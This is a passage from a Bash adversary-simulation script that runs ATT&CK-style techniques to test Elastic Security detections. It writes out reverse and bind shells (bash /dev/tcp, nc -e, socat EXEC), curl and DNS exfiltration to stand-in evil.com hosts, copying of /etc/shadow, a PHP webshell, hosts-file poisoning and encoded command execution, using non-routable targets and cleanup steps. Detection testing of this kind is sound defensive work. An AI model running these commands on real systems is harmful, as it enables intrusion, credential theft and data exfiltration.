    ok "ss -tlnp, ss -ulnp, ss -anp, netstat -an executed"

    t "Process Discovery"
    info "Elastic: Process Discovery"
    ps auxf > /dev/null 2>&1
    ps -eo user,pid,ppid,%cpu,%mem,cmd > /dev/null 2>&1
    ok "ps auxf, ps -eo executed"

    t "Account Discovery"
    info "Elastic: Local Account Discovery"
    lastlog 2>/dev/null > /dev/null; last -20 2>/dev/null > /dev/null
    w > /dev/null 2>&1; who > /dev/null 2>&1
    awk -F: '($7 != "/usr/sbin/nologin" && $7 != "/bin/false"){print}' /etc/passwd > /dev/null 2>&1
    ok "lastlog, last, w, who, passwd parsing executed"

    t "Security Software Discovery"
    info "Elastic: Security Software Discovery"
    ps aux | grep -iE 'elastic|filebeat|auditbeat|wazuh|falco|ossec|crowdstrike|splunk' | grep -v grep > /dev/null 2>&1
    systemctl list-units --type=service 2>/dev/null | grep -iE 'elastic|wazuh|falco|auditd' > /dev/null 2>&1
    dpkg -l 2>/dev/null | grep -iE 'elastic|wazuh|ossec|clamav' > /dev/null || rpm -qa 2>/dev/null | grep -iE 'elastic|wazuh' > /dev/null
    ok "Enumerated running security tools (ps, systemctl, dpkg/rpm)"

    t "Virtualization Detection"
    info "Elastic: Virtual Machine Fingerprinting"
    systemd-detect-virt 2>/dev/null > /dev/null || true
    dmesg 2>/dev/null | grep -iE 'vmware|virtualbox|kvm|xen|hyper-v|qemu' > /dev/null 2>&1 || true
    cat /sys/class/dmi/id/product_name 2>/dev/null > /dev/null || true
    ok "systemd-detect-virt, dmesg hypervisor check, DMI check executed"

    t "Internal Network Host Discovery (ARP + ping)"
    info "Elastic: Network Host Discovery"
    arp -a 2>/dev/null > /dev/null || ip neigh > /dev/null 2>&1
    cat /etc/hosts > /dev/null 2>&1
    ok "arp -a, ip neigh, cat /etc/hosts executed"

    t "Docker/Container Enumeration"
    docker ps -a 2>/dev/null > /dev/null || true
    docker images 2>/dev/null > /dev/null || true
    kubectl get pods --all-namespaces 2>/dev/null > /dev/null || true
    kubectl get secrets --all-namespaces 2>/dev/null > /dev/null || true
    ok "docker ps, docker images, kubectl get pods/secrets executed"

    t "Mounted Shares and File Systems"
    mount > /dev/null 2>&1; cat /etc/fstab > /dev/null 2>&1
    findmnt > /dev/null 2>&1 || true
    ok "mount, cat /etc/fstab, findmnt executed"
}

# ============================================================================
# LATERAL MOVEMENT (TA0008)
# ============================================================================
test_lateral_movement() {
    hdr "LATERAL MOVEMENT (TA0008)"

    t "SSH Connection Attempt to Non-Existent Host"
    info "Elastic: SSH Remote Session Activity"
    ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o BatchMode=yes root@10.0.0.50 "hostname" 2>/dev/null || true
    ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o BatchMode=yes root@10.0.0.51 "hostname" 2>/dev/null || true
    ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no -o BatchMode=yes root@192.168.1.100 "hostname" 2>/dev/null || true
    ok "ssh -o BatchMode=yes to 3 non-existent hosts"

    t "SSH Known Hosts Manipulation"
    info "Elastic: Known Hosts Modification"
    mkdir -p /root/.ssh
    echo "10.0.0.50 ssh-rsa AAAAB3_APT_SIM_LATERAL" >> /root/.ssh/known_hosts 2>/dev/null
    echo "10.0.0.51 ssh-rsa AAAAB3_APT_SIM_LATERAL" >> /root/.ssh/known_hosts 2>/dev/null
    ok "Added suspicious entries to known_hosts"
    cl "sed -i '/_APT_SIM_LATERAL/d' /root/.ssh/known_hosts 2>/dev/null"

    t "SCP Transfer Attempt"
    scp -o ConnectTimeout=2 /etc/hostname root@10.0.0.50:/tmp/ 2>/dev/null || true
    ok "scp attempted to non-existent host"

    t "SSH-Keyscan Execution"
    info "Elastic: SSH-Keyscan Execution"
    ssh-keyscan 127.0.0.1 2>/dev/null > /dev/null || true
    ssh-keyscan 10.0.0.50 2>/dev/null > /dev/null || true
    ok "ssh-keyscan 127.0.0.1 and 10.0.0.50 executed"

    t "SSH-Keygen Execution"
    info "Elastic: SSH Key Generation"
    ssh-keygen -t rsa -b 2048 -f /tmp/.apt-sim-key -N "" -q 2>/dev/null || true
    ok "ssh-keygen -t rsa (new key pair generated)"
    cl "rm -f /tmp/.apt-sim-key /tmp/.apt-sim-key.pub"
}

# ============================================================================
# COLLECTION (TA0009)
# ============================================================================
test_collection() {
    hdr "COLLECTION (TA0009)"

    t "Data Staging — Copy Sensitive Files"
    info "Elastic: Sensitive File Copy"
    mkdir -p "$APTDIR/staging"
    cp /etc/passwd "$APTDIR/staging/" 2>/dev/null
    cp /etc/shadow "$APTDIR/staging/" 2>/dev/null
    cp /etc/hosts "$APTDIR/staging/" 2>/dev/null
    cp /etc/ssh/sshd_config "$APTDIR/staging/" 2>/dev/null
    ok "cp /etc/shadow, passwd, hosts, sshd_config to staging dir"
    cl "rm -rf $APTDIR/staging"

    t "Archive via tar (Data Compression)"
    info "Elastic: Archiving via Tar"
    tar czf /tmp/.apt-sim-loot.tar.gz "$APTDIR/staging" 2>/dev/null
    ok "tar czf /tmp/.apt-sim-loot.tar.gz executed"
    cl "rm -f /tmp/.apt-sim-loot.tar.gz"

    t "Archive with zip"
    if command -v zip &>/dev/null; then
        zip -r /tmp/.apt-sim-loot.zip "$APTDIR/staging" 2>/dev/null
        ok "zip -r executed"
        cl "rm -f /tmp/.apt-sim-loot.zip"
    else
        fail "zip not installed"
    fi

    t "Clipboard Access Attempt"
    xclip -o 2>/dev/null > /dev/null || true
    xsel --clipboard 2>/dev/null > /dev/null || true
    ok "xclip -o and xsel --clipboard attempted"

    t "Screen Capture Attempt"
    info "Elastic: Screen Capture Activity"
    import -window root /tmp/.apt-sim-screenshot.png 2>/dev/null || true
    xwd -root -out /tmp/.apt-sim-screenshot.xwd 2>/dev/null || true
    ok "import/xwd screen capture attempted"
    cl "rm -f /tmp/.apt-sim-screenshot.png /tmp/.apt-sim-screenshot.xwd"
}

# ============================================================================
# COMMAND AND CONTROL (TA0011) — Generate real network events
# ============================================================================
test_c2() {
    hdr "COMMAND AND CONTROL (TA0011)"

    # --- Elastic Rule: "DNS Activity to Suspicious Domain" ---
    t "C2 Domain DNS Resolution"
    info "Elastic: DNS Query to Suspicious/Uncommon Domain"
    for domain in "evil-c2.attacker.com" "cdn.malware-cdn.net" "api.cobaltstrike-c2.io" \
                  "beacon.sliver-framework.org" "update.apt-implant.biz" \
                  "sync.data-exfil.xyz" "health.mythic-c2.com" "ws.brute-ratel.net"; do
        nslookup "$domain" > /dev/null 2>&1 || true
        dig "$domain" A +short > /dev/null 2>&1 || true
        host "$domain" > /dev/null 2>&1 || true
    done
    ok "nslookup + dig + host to 8 suspicious C2 domains"

    # --- DNS Tunneling ---
    t "DNS Tunneling (Long Encoded Subdomains)"
    info "Elastic: Suspicious DNS Query with Long Subdomain"
    for i in $(seq 1 10); do
        ENCODED=$(echo "exfiltrated-data-packet-${i}-$(hostname)-$(date +%s)" | base64 | tr -d '=\n' | tr '+/' '-_' | cut -c1-50)
        nslookup "${ENCODED}.tunnel.dns-c2.evil.com" > /dev/null 2>&1 || true
    done
    ok "10 DNS queries with base64-encoded long subdomains"

    # --- Elastic Rule: "EICAR Test File" ---
    t "EICAR Test File Drop"
    info "Elastic: EICAR Test File / Malware Indicator"
    EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
    for path in /tmp/eicar.com /tmp/eicar.txt /var/tmp/update.bin /dev/shm/healthcheck; do
        echo "$EICAR" > "$path" 2>/dev/null
    done
    ok "EICAR test files dropped in 4 locations"
    cl "rm -f /tmp/eicar.com /tmp/eicar.txt /var/tmp/update.bin /dev/shm/healthcheck"

    # --- Elastic Rule: "Hacking Tool Detection" ---
    t "Hacking Tool Drop + Execute"
    info "Elastic: Known Hacking Tool Execution"
    for tool in linpeas.sh pspy64 chisel ncat socat; do
        echo '#!/bin/bash' > "/tmp/$tool"
        echo "echo 'APT-SIM: $tool'" >> "/tmp/$tool"
        chmod +x "/tmp/$tool"
        "/tmp/$tool" 2>/dev/null || true
    done
    ok "Dropped + executed fake tools: linpeas, pspy64, chisel, ncat, socat"
    cl "rm -f /tmp/linpeas.sh /tmp/pspy64 /tmp/chisel /tmp/ncat /tmp/socat"

    # --- Curl to suspicious external ---
    t "Curl to External IP Services"
    info "Elastic: Suspicious Curl/Wget Network Connection"
    curl -s -m 3 http://ifconfig.me > /dev/null 2>&1 || true
    curl -s -m 3 http://ipinfo.io > /dev/null 2>&1 || true
    curl -s -m 3 http://checkip.amazonaws.com > /dev/null 2>&1 || true
    wget -q -O /dev/null http://ifconfig.me 2>/dev/null || true
    ok "curl/wget to ifconfig.me, ipinfo.io, checkip.amazonaws.com"

    # --- Reverse Shell Activity ---
    t "Reverse Shell Activity via Bash"
    info "Elastic: Potential Reverse Shell Activity via Terminal"
    # Safe: connects to non-routable IP, will timeout immediately
    timeout 2 bash -c 'bash -i >& /dev/tcp/10.255.255.1/4444 0>&1' 2>/dev/null || true
    ok "bash -i >& /dev/tcp/10.255.255.1/4444 executed (timeout 2s)"

    t "Reverse Shell via Python"
    if command -v python3 &>/dev/null; then
        timeout 2 python3 -c "
import socket,subprocess,os
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(1)
    s.connect(('10.255.255.1',4444))
except: pass
" 2>/dev/null || true
        ok "python3 socket.connect to 10.255.255.1:4444 executed"
    else
        fail "python3 not available"
    fi

    t "Netcat Reverse Shell Attempt"
    timeout 2 nc -w 1 10.255.255.1 4444 -e /bin/bash 2>/dev/null || true
    timeout 2 ncat -w 1 10.255.255.1 4444 -e /bin/bash 2>/dev/null || true
    ok "nc/ncat -e /bin/bash to 10.255.255.1:4444 attempted"

    t "Socat Execution"
    info "Elastic: Socat Execution with Network Activity"
    timeout 2 socat TCP:10.255.255.1:4444 EXEC:/bin/bash 2>/dev/null || true
    ok "socat TCP:... EXEC:/bin/bash attempted"

    # --- Port Scanning ---
    t "Port Scanning Activity"
    info "Elastic: Network Port Scan"
    for port in 22 80 443 3306 8080; do
        (echo >/dev/tcp/127.0.0.1/$port) 2>/dev/null || true
    done
    if command -v nmap &>/dev/null; then
        nmap -sT -T4 --top-ports 20 127.0.0.1 > /dev/null 2>&1 || true
        ok "nmap --top-ports 20 127.0.0.1 executed"
    else
        ok "/dev/tcp port scan on localhost executed"
    fi
}

# ============================================================================
# EXFILTRATION (TA0010) — Execute real exfil behaviors
# ============================================================================
test_exfiltration() {
    hdr "EXFILTRATION (TA0010)"

    t "Data Exfiltration via Curl POST"
    info "Elastic: Suspicious Curl Data Exfiltration"
    echo "simulated_sensitive_data" > /tmp/.apt-sim-exfil
    curl -s -m 2 -X POST -d @/tmp/.apt-sim-exfil http://10.255.255.1/upload 2>/dev/null || true
    ok "curl -X POST -d @file to external IP executed"
    cl "rm -f /tmp/.apt-sim-exfil"

    t "DNS-Based Exfiltration"
    info "Elastic: DNS Data Exfiltration"
    echo "root:x:0:0" | base64 | tr -d '=\n' | fold -w 30 | while read chunk; do
        dig "${chunk}.exfil.evil.com" > /dev/null 2>&1 || true
    done
    ok "base64-encoded data exfiltrated via DNS subdomains"

    t "Encrypted Data for Exfiltration"
    if command -v openssl &>/dev/null; then
        echo "SENSITIVE_DATA_$(hostname)" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:exfilkey -out /tmp/.apt-sim-enc 2>/dev/null
        ok "openssl enc -aes-256-cbc encrypted data blob created"
        cl "rm -f /tmp/.apt-sim-enc"
    else
        fail "openssl not available"
    fi

    t "Netcat Exfiltration Attempt"
    echo "exfil_data" | timeout 2 nc -w 1 10.255.255.1 4444 2>/dev/null || true
    ok "echo 'data' | nc 10.255.255.1 4444 attempted"
}

# ============================================================================
# IMPACT (TA0040)
# ============================================================================
test_impact() {
    hdr "IMPACT (TA0040)"

    # --- Elastic Rule: "Ransomware Behavior" ---
    t "Ransomware Simulation (Mass File Rename)"
    info "Elastic: Suspicious File Rename/Encryption Activity"
    mkdir -p "$APTDIR/ransomware"
    for i in $(seq 1 20); do
        echo "Important document $i" > "$APTDIR/ransomware/doc_$i.txt"
    done
    for f in "$APTDIR/ransomware/"*.txt; do
        mv "$f" "${f}.encrypted" 2>/dev/null
    done
    echo "YOUR FILES ARE ENCRYPTED - APT SIM" > "$APTDIR/ransomware/README_DECRYPT.txt"
    ok "20 files renamed to .encrypted + ransom note dropped"
    cl "rm -rf $APTDIR/ransomware"

    # --- Elastic Rule: "Service Stop" ---
    t "Service Stop Commands"
    info "Elastic: Service Stopped via systemctl/service"
    systemctl stop cron 2>/dev/null || true
    service cron stop 2>/dev/null || true
    systemctl stop atd 2>/dev/null || true
    ok "systemctl stop cron/atd executed"
    cl "systemctl start cron 2>/dev/null; systemctl start atd 2>/dev/null"

    # --- Elastic Rule: "Cryptominer" ---
    t "Cryptominer Indicators"
    info "Elastic: Cryptocurrency Mining Activity"
    cp /bin/true /tmp/.xmrig 2>/dev/null
    chmod +x /tmp/.xmrig
    /tmp/.xmrig 2>/dev/null || true
    ok "Fake xmrig binary dropped and executed"
    cl "rm -f /tmp/.xmrig"

    # --- Hosts File Modification ---
    t "Hosts File Modification"
    info "Elastic: /etc/hosts File Modification"
    cp /etc/hosts /etc/hosts.apt-sim-bak
    echo "# APT-SIM" >> /etc/hosts
    echo "10.0.0.99 updates.microsoft.com" >> /etc/hosts
    echo "10.0.0.99 security.ubuntu.com" >> /etc/hosts
    ok "Poisoned /etc/hosts (redirected update domains)"
    cl "cp /etc/hosts.apt-sim-bak /etc/hosts; rm -f /etc/hosts.apt-sim-bak"

    # --- Data Destruction Indicators ---
    t "dd Execution (Data Destruction Indicator)"
    info "Elastic: Suspicious dd Activity"
    dd if=/dev/zero of=/tmp/.apt-sim-wipe bs=1K count=10 2>/dev/null
    ok "dd if=/dev/zero of=/tmp/.apt-sim-wipe executed"
    cl "rm -f /tmp/.apt-sim-wipe"

    # --- Kill Process ---
    t "Process Kill Commands"
    info "Elastic: Process Termination"
    pkill -0 -f "nonexistent_apt_sim_process" 2>/dev/null || true
    kill -9 99999 2>/dev/null || true
    killall nonexistent_apt_sim 2>/dev/null || true
    ok "pkill, kill -9, killall executed (against non-existent targets)"
}

# ============================================================================
# ADVANCED — Additional execution-based tests
# ============================================================================
test_advanced() {
    hdr "ADVANCED TRADECRAFT (BONUS)"

    t "Webshell Indicators (File Creation in Web Root)"
    info "Elastic: Web Shell Detection"
    WEB_ROOTS=("/var/www/html" "/var/www" "/usr/share/nginx/html")
    for dir in "${WEB_ROOTS[@]}"; do
        if [ -d "$dir" ]; then
            echo '<?php system($_GET["cmd"]); ?>' > "$dir/.apt-sim-shell.php"
            ok "Webshell created in $dir"
            cl "rm -f $dir/.apt-sim-shell.php"
            break
        fi
    done

    t "Setuid/Setgid Shell Escape via awk"
    info "Elastic: Shell Spawned from GTFOBin"
    awk 'BEGIN {system("echo awk_shell_escape")}' 2>/dev/null
    ok "awk 'BEGIN {system(...)}' executed"

    t "Python Script with Network Socket"
    if command -v python3 &>/dev/null; then
        timeout 2 python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(1)
try: s.connect(('10.255.255.1', 443))
except: pass
s.close()
" 2>/dev/null || true
        ok "python3 socket connection attempt executed"
    fi

    t "XOR/Base64 Encoded Command Execution"
    ENCODED=$(echo 'id; whoami; hostname' | base64)
    echo "$ENCODED" | base64 -d | bash > /dev/null 2>&1
    ok "Decoded and executed base64 command chain"

    t "Process Name with Brackets (Kernel Thread Masquerade)"
    bash -c 'exec -a "[kworker/0:2]" sleep 3' &
    FAKE_PID=$!
    ok "Process masquerading as [kworker/0:2] (PID: $FAKE_PID)"
    sleep 1
    kill $FAKE_PID 2>/dev/null

    t "File Download to /dev/shm + Execute"
    info "Elastic: Suspicious Download + Execute from Temp Directory"
    echo '#!/bin/bash' > /dev/shm/.payload
    echo 'echo "payload_executed"' >> /dev/shm/.payload
    chmod +x /dev/shm/.payload
    /dev/shm/.payload > /dev/null 2>&1
    rm -f /dev/shm/.payload
    ok "Download → chmod +x → execute in /dev/shm chain"

    t "Suspicious String in Process Arguments"
    info "Elastic: Suspicious Process Arguments"
    bash -c 'echo "c2_beacon: http://evil.com/callback"' > /dev/null 2>&1
    bash -c 'echo "reverse_shell_established"' > /dev/null 2>&1
    ok "Process with suspicious C2 strings in args"

    t "Bind Shell Listener (Netcat)"
    info "Elastic: Netcat Listener Established"
    timeout 3 nc -lnvp 31337 &>/dev/null &
    NC_PID=$!
    sleep 1
    kill $NC_PID 2>/dev/null || true
    ok "nc -lnvp 31337 listener started and killed"

    t "Socat Bind Shell"
    timeout 3 socat TCP-LISTEN:31338,reuseaddr,fork EXEC:/bin/bash &>/dev/null &
    SOCAT_PID=$!
    sleep 1
    kill $SOCAT_PID 2>/dev/null || true
    ok "socat TCP-LISTEN:31338 EXEC:/bin/bash started and killed"

    t "SSH Agent Socket Enumeration"
    info "Elastic: SSH Agent Hijacking"
    find /tmp -path "*/ssh-*" -name "agent.*" 2>/dev/null > /dev/null
    ls -la /tmp/ssh-* 2>/dev/null > /dev/null || true
    ok "find /tmp -path '*/ssh-*' -name 'agent.*' executed"

    t "Suspicious Chown/Chmod Execution"
    info "Elastic: Ownership Change in Unusual Location"
    touch /tmp/.apt-sim-owned
    chown nobody:nogroup /tmp/.apt-sim-owned 2>/dev/null || true
    chmod 4755 /tmp/.apt-sim-owned 2>/dev/null
    ok "chown + chmod 4755 on /tmp file"
    cl "rm -f /tmp/.apt-sim-owned"

    t "Suspicious File Rename (Binary Masquerading)"
    cp /bin/ls /tmp/.apt-sim-sshd 2>/dev/null
    /tmp/.apt-sim-sshd > /dev/null 2>&1 || true
    ok "ls renamed to sshd and executed from /tmp"
    cl "rm -f /tmp/.apt-sim-sshd"
}

# ============================================================================
# SUMMARY & CLEANUP INFO
# ============================================================================
print_summary() {
    echo ""
    echo -e "  ${BOLD}${RED}┌────────────────────────────────────────────────────────────┐${NC}"
    echo -e "  ${BOLD}${RED}│${NC} ${BOLD}SIMULATION COMPLETE${NC}"
    echo -e "  ${BOLD}${RED}└────────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "    Total : ${BOLD}${TC}${NC}"
    echo -e "    Pass  : ${GREEN}${BOLD}${PC}${NC}"
    echo -e "    Fail  : ${RED}${BOLD}${FC}${NC}"
    echo ""
    echo -e "    ${DIM}Log     : ${LOGFILE}${NC}"
    echo -e "    ${DIM}Cleanup : ${CLEANUP}${NC}"
    echo ""
    echo -e "    ${CYAN}Revert:${NC} ${BOLD}sudo bash ${CLEANUP}${NC}"
    echo ""
    echo -e "    ${GREEN}→ Check Elastic Security > Alerts for detections${NC}"
    echo ""
}

# ============================================================================
# MENU
# ============================================================================
run_all() {
    test_execution
    test_persistence
    test_privesc
    test_defense_evasion
    test_credential_access
    test_discovery
    test_lateral_movement
    test_collection
    test_c2
    test_exfiltration
    test_impact
    test_advanced
    print_summary
}

show_menu() {
    echo "  Select:"
    echo ""
    echo -e "    ${BOLD}[0]${NC}  RUN ALL"
    echo -e "    ${BOLD}[1]${NC}  Execution              (TA0002)"
    echo -e "    ${BOLD}[2]${NC}  Persistence            (TA0003)"
    echo -e "    ${BOLD}[3]${NC}  Privilege Escalation   (TA0004)"
    echo -e "    ${BOLD}[4]${NC}  Defense Evasion        (TA0005)"
    echo -e "    ${BOLD}[5]${NC}  Credential Access      (TA0006)"
    echo -e "    ${BOLD}[6]${NC}  Discovery              (TA0007)"
    echo -e "    ${BOLD}[7]${NC}  Lateral Movement       (TA0008)"
    echo -e "    ${BOLD}[8]${NC}  Collection             (TA0009)"
    echo -e "    ${BOLD}[9]${NC}  Command & Control      (TA0011)"
    echo -e "    ${BOLD}[A]${NC}  Exfiltration           (TA0010)"
    echo -e "    ${BOLD}[B]${NC}  Impact                 (TA0040)"
    echo -e "    ${BOLD}[C]${NC}  Advanced Tradecraft"
    echo -e "    ${BOLD}[D]${NC}  ${YELLOW}Disable Security Tools  (standalone, NOT in RUN ALL)${NC}"
    echo -e "    ${BOLD}[X]${NC}  Exit"
    echo ""
    echo -n "  > "
    read -r c
    echo ""
    case "$c" in
        0) run_all ;; 1) test_execution && print_summary ;;
        2) test_persistence && print_summary ;; 3) test_privesc && print_summary ;;
        4) test_defense_evasion && print_summary ;; 5) test_credential_access && print_summary ;;
        6) test_discovery && print_summary ;; 7) test_lateral_movement && print_summary ;;
        8) test_collection && print_summary ;; 9) test_c2 && print_summary ;;
        [aA]) test_exfiltration && print_summary ;; [bB]) test_impact && print_summary ;;
        [cC]) test_advanced && print_summary ;; [dD]) test_disable_security_tools && print_summary ;;
        [xX]) exit 0 ;;
        *) echo -e "  ${RED}Invalid${NC}"; show_menu ;;
    esac
}

check_root
banner
setup
if [ "$1" == "--auto" ] || [ "$1" == "-a" ]; then
    echo -e "  ${YELLOW}Full auto mode...${NC}"; echo ""; run_all
else
    show_menu
fi